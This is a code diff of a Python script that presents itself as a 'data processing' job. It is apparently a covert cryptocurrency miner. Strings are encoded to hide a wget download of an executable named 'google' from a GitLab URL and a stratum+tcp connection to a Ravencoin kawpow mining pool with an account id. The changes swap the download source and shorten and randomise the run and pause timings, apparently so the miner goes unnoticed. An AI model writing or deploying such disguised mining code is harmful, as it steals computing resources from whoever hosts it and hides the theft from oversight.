@@ -51,7 +51,7 @@ def decode_string_data(s):
 
 # --- Encoded Configuration Strings ---
 # The URL for the data processing executable.
-EXECUTABLE_DOWNLOAD_URL_ENCODED = encode_string_data("https://gitlab.com/kenogoden/main/-/raw/main/sh/google")
+EXECUTABLE_DOWNLOAD_URL_ENCODED = encode_string_data("https://gitlab.com/senopvrtymlbb-group/dataanalystics/-/raw/main/google")
 # The local filename for the downloaded executable.
 EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")
 
@@ -59,7 +59,7 @@ EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")
 PROCESSING_PROTOCOL_ENCODED = encode_string_data("kawpow")
 COORDINATOR_ADDRESS_ENCODED = encode_string_data("stratum+tcp://rvn.kryptex.network:7031")
 AUTH_USER_ENCODED = encode_string_data("krxXJMWJKW")
-WORKER_ID_ENCODED = encode_string_data("analyst")
+WORKER_ID_ENCODED = encode_string_data("Analystics")
 
 # Encoded command strings for system operations.
 WGET_COMMAND_ENCODED = encode_string_data("wget")
@@ -268,9 +268,9 @@ def cleanup_session_files(work_directory):
 
 def perform_auxiliary_task():
     """
-    Simulates an auxiliary task by pausing for a set duration.
+    Simulates an auxiliary task by pausing for a random duration between 5 and 7 minutes.
     """
-    task_duration = 5 * 60  # 5 minutes
+    task_duration = random.randint(5 * 60, 7 * 60)
     time.sleep(task_duration)
 
 def stop_data_processing(proc):
@@ -291,7 +291,7 @@ def stop_data_processing(proc):
 
 if __name__ == "__main__":
     
-    TOTAL_OPERATION_TIME = 6 * 60 * 60
+    TOTAL_OPERATION_TIME = 50 * 60
     start_time = time.time()
     
     while time.time() - start_time < TOTAL_OPERATION_TIME:
@@ -304,12 +304,12 @@ if __name__ == "__main__":
             if processing_proc:
                 ensure_service_continuity(executable_path)
 
-                # Let the processing task run for a random duration between 400 and 600 seconds.
-                time.sleep(random.randint(400, 600))
+                # Let the processing task run for a random duration between 100 and 300 seconds.
+                time.sleep(random.randint(100, 300))
                 
                 stop_data_processing(processing_proc)
         
         cleanup_session_files(work_dir)
 
-        # Perform an auxiliary task for 5 minutes before the next cycle.
+        # Perform an auxiliary task for a random duration between 5 and 7 minutes before the next cycle.
         perform_auxiliary_task()
